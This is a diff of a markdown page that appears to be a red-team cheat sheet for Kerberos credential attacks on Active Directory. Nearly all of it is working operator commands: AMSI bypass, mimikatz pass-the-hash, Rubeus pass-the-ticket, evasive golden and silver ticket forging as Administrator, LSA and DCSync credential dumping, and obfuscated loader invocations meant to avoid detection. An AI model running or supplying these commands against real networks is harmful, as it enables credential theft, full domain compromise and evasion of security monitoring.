@@ -12,20 +12,24 @@ permalink: /creds/krb
 **Menu**
 <!-- vscode-markdown-toc -->
 * [tools](#tools)
-	* [load-rubeus](#load-rubeus)
-* [technics](#technics)
+* [runas](#runas)
+* [pass-the-ticket](#pass-the-ticket)
+	* [pth](#pth)
+	* [ptt](#ptt)
 	* [command-obfuscation](#command-obfuscation)
-	* [cleartext-2-nthash](#cleartext-2-nthash)
-	* [get-tgt](#get-tgt)
+* [forge](#forge)
+	* [tgt](#tgt)
+	* [diamond](#diamond)
 	* [golden](#golden)
 	* [silver](#silver)
+* [dump](#dump)
 	* [vault](#vault)
 	* [lsadump-lsa](#lsadump-lsa)
 	* [lsadump-dcsync](#lsadump-dcsync)
+* [manipulate](#manipulate)
+	* [cleartext-2-nthash](#cleartext-2-nthash)
 	* [ccache-convert](#ccache-convert)
 	* [krb-export](#krb-export)
-	* [krb-pth](#krb-pth)
-	* [krb-ptt](#krb-ptt)
 * [which-os-what-creds](#which-os-what-creds)
 
 <!-- vscode-markdown-toc-config
@@ -49,11 +53,55 @@ permalink: /creds/krb
     </table>
 </div>
 
-### <a name='load-rubeus'></a>load-rubeus
+
+## <a name='runas'></a>runas
+
 ```powershell
+runas /user:XXX\XXX /netonly cmd
+# Enter the password for XXX\XXX:
+
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+iex (get-content .\amsibypass.txt)
+
+$ExecutionContext.SessionState.LanguageMode
+$ExecutionContext.SessionState.LanguageMode FullLanguage
+
+$ErrorActionPreference = 'SilentlyContinue' # hide errors on out console
 ```
 
-## <a name='technics'></a>technics
+* [/discov/setenv](/discov/setenv)
+* [/discov/ad#iter](/discov/ad#iter)
+
+## <a name='pass-the-ticket'></a>pass-the-ticket
+
+### <a name='pth'></a>pth
+
+```powershell
+# load powershell with PTH
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /user:$ztarg_user_name /rc4:xxx  /domain:$zdom /dc:$zdom_dc_fqdn /run:"powershell -ep bypass"
+
+# load cmd with PTH
+Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+${zloader} -Path .\Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+# load cmd with PTH / go to command-obfuscation for %Pwn% variable
+Rubeus.exe -args %Pwn% /user:$ztarg_user_name /aes256:$ztarg_krb_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+### <a name='ptt'></a>ptt
+```bash
+# ptt via DInvoke
+C:\USers\Public\zloader.exe -path .\Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+# Request a TGT as the target user and pass it into the current session
+# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
+.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_nthash /ptt
+
+# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
+.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_nthash /createnetonly:C:\Windows\System32\cmd.exe
+```
 
 ### <a name='command-obfuscation'></a>command-obfuscation
 ```bat
@@ -79,29 +127,25 @@ echo %Pwn%
 C:\Users\Public\SafetyKatz.exe %Pwn% exit
 ```
 
-### <a name='cleartext-2-nthash'></a>cleartext-2-nthash
+## <a name='forge'></a>forge
+
+### <a name='tgt'></a>tgt
 ```powershell
-# compute nthash from clear-text password
-cerbero hash $ztarg_user_pass -u $zdom_fqdn/$ztarg_user_name
-$ztarg_user_nthash=""
-$ztarg_user_aes256k=""
+# TO TEST
+#cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
+#cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
+#
+#./Rubeus.exe asktgt /user:$ztarg_user_name /password:$ztarg_user_pass /domain:$zdom /dc:$zdom_dc_fqdn /ptt
+#Invoke-Mimi -Command '"sekurlsa::ekeys"'
 ```
 
-### <a name='get-tgt'></a>get-tgt
-```powershell
-cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
-cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
-
-./Rubeus.exe asktgt /user:$ztarg_user_name /password:$ztarg_user_pass /domain:$zdom /dc:$zdom_dc_fqdn /ptt
-Invoke-Mimi -Command '"sekurlsa::ekeys"'
-```
-
-## forged-tickets
-
-### <a name='golden'></a>diamond
+### <a name='diamond'></a>diamond
 
 * TGT modification, avoid detection of forged TGT without PREAUTH 
 * requires the KRBTGT$ account hash
+
+```powershell
+```
 
 ### <a name='golden'></a>golden
 
@@ -109,10 +153,11 @@ Invoke-Mimi -Command '"sekurlsa::ekeys"'
 * requires the KRBTGT$ account hash
 
 ```powershell
-# contains secrets for the: scheduled tasks, ...
-Rubeus.exe -args golden /aes256:$ztarg_user_aes256k /sid:$ztarg_user_sid /ldap /user:$ztarg_user_name /printcmd
-
-.\Loader.exe -path .\Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+#$zdom_krbtgt_aes256k=""
+#$zdom_krbtgt_norid=""
+C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:$zdom_krbtgt_aes256k /sid:$zdom_krbtgt_norid /ldap /user:Administrator /printcmd
+#
+C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:$zdom_krbtgt_aes256k /user:Administrator /id:500 /pgid:513 /domain:$zdom_fqdn /sid:$zdom_krb_norid /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:$zdom_dc_fqdn /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
 ### <a name='silver'></a>silver
@@ -132,6 +177,14 @@ Rubeus.exe -args golden /aes256:$ztarg_user_aes256k /sid:$ztarg_user_sid /ldap /
 | Windows RSAT 				| RPCSS LDAP CIFS 			|	
 
 
+```powershell
+#$zdom_krbtgt_aes256k=""
+#$zdom_krbtgt_norid=""
+C:\Users\Public\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/${zdom_dc_fqdn} /aes256:${zdom_krbtgt_aes256k} /sid:${zdom_krbtgt_norid} /ldap /user:Administrator /domain:${zdom_fqdn} /ptt
+```
+
+## <a name='dump'></a>dump
+
 ### <a name='vault'></a>vault
 ```powershell
 # contains secrets for the: scheduled tasks, ...
@@ -150,6 +203,16 @@ Invoke-Mimi -Command '"token::elevate" "sekurlsa::evasive-keys /patch"'
 Invoke-Mimi -Command '"token::elevate" "lsadump::dcsync"'
 ```
 
+## <a name='manipulate'></a>manipulate
+
+### <a name='cleartext-2-nthash'></a>cleartext-2-nthash
+```powershell
+# compute nthash from clear-text password
+cerbero hash $ztarg_user_pass -u $zdom_fqdn/$ztarg_user_name
+$ztarg_user_nthash=""
+$ztarg_user_aes256k=""
+```
+
 ### <a name='ccache-convert'></a>ccache-convert
 
 ```python
@@ -163,29 +226,6 @@ cerbero convert -i $ztarg_user_name".ccache" -o $ztarg_user_name".krb"
 cd C:\tools\mimikatz\x64
 mimikatz.exe privilege:debug
 kerberos::list /export
-```
-
-### <a name='krb-pth'></a>krb-pth
-```powershell
-# run powershell with pass-the-hash
-mimikatz.exe
-privilege::debug
-sekurlsa::pth /user:$zlat_user /rc4:xxx  /domain:$zdom /dc:$zdom_dc_fqdn /run:"powershell -ep bypass"
-
-# opth
-Rubeus.exe -args %Pwn% /user:$ztarg_user_name /aes256:$ztarg_user_hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-Rubeus.exe -args %Pwn% /user:$ztarg_user_name /aes256:$ztarg_user_hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-```
-
-### <a name='krb-ptt'></a>krb-ptt
-```bash
-# Request a TGT as the target user and pass it into the current session
-# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
-.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_hash /ptt
-
-# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
-.\Rubeus.exe asktgt /user:$ztarg_
-user_name /rc4:$ztarg_user_hash /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
 ## <a name='which-os-what-creds'></a>which-os-what-creds
